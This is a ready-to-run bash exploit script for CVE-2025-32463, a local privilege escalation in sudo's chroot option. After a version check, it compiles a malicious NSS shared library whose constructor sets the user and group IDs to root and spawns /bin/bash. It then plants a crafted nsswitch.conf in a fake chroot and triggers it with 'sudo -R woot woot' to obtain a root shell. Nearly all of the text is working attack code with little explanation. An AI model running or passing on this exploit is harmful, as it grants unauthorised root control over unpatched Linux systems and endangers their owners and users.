#!/bin/bash
# by 4TH1L10

RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
YELLOW=$(tput setaf 3)
BLUE=$(tput setaf 4)
CYAN=$(tput setaf 6)
RESET=$(tput sgr0)

AFFECTED_UNTIL="1.9.17p1"
STAGE=""

echo ""
echo "${RED}*** *************************** ***${RESET}"
echo "${RED}*** CVE-2025-32463 | by 4TH1L10 ***${RESET}"
echo "${RED}*** *************************** ***${RESET}"
echo ""

cleanup() {
  if [ -n "${STAGE}" ] && [ -d "${STAGE}" ]; then
    echo "${CYAN}[*] Cleaning up temporary files...${RESET}"
    rm -rf "${STAGE}"
  fi
}

trap cleanup EXIT

if ! command -v sudo >/dev/null; then
  echo "${RED}[!] 'sudo' command not found. Exiting.${RESET}"
  exit 1
fi

echo "${CYAN}[*] Checking sudo version...${RESET}"
CURRENT_VERSION=$(sudo -V | head -n1 | awk '{print $3}')

if [ -z "${CURRENT_VERSION}" ]; then
  echo "${RED}[!] Unable to determine sudo version. Exiting.${RESET}"
  exit 1
fi

echo "    ${BLUE}- Current Version:${RESET} ${CURRENT_VERSION}"
echo "    ${BLUE}- Patched Version:${RESET} ${AFFECTED_UNTIL}"

if printf '%s\n' "${AFFECTED_UNTIL}" "${CURRENT_VERSION}" | sort -V -C >/dev/null 2>&1; then
  echo "${GREEN}[+] System is NOT VULNERABLE to CVE-2025-32463 (sudo version is ${CURRENT_VERSION} or newer).${RESET}"
  exit 0
else
  echo "${RED}[!] System is POTENTIALLY VULNERABLE to CVE-2025-32463 (sudo version is older than ${AFFECTED_UNTIL}).${RESET}"
fi

echo "${CYAN}[*] Continuing with exploitation...${RESET}"

STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd "${STAGE}" || exit 1

cat > woot1337.c <<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/bash", "/bin/bash", NULL);
}
EOF

echo "${CYAN}[*] Compiling malicious shared library...${RESET}"
mkdir -p woot/etc libnss_
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

if [ ! -f "libnss_/woot1337.so.2" ]; then
  echo "${RED}[!] Compilation failed. Aborting.${RESET}"
  exit 1
fi

echo "${GREEN}[+] Compilation successful.${RESET}"

echo "${CYAN}[*] Preparing chroot environment...${RESET}"
echo "passwd: files /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc/
echo "${GREEN}[+] Environment ready.${RESET}"

echo "${YELLOW}[*] Triggering exploit for CVE-2025-32463...${RESET}"
echo "${RED}[!] If successful, you will get a root shell. The script will wait until you exit the shell.${RESET}"

sudo -R woot woot

echo "${CYAN}[*] Exploit finished.${RESET}"
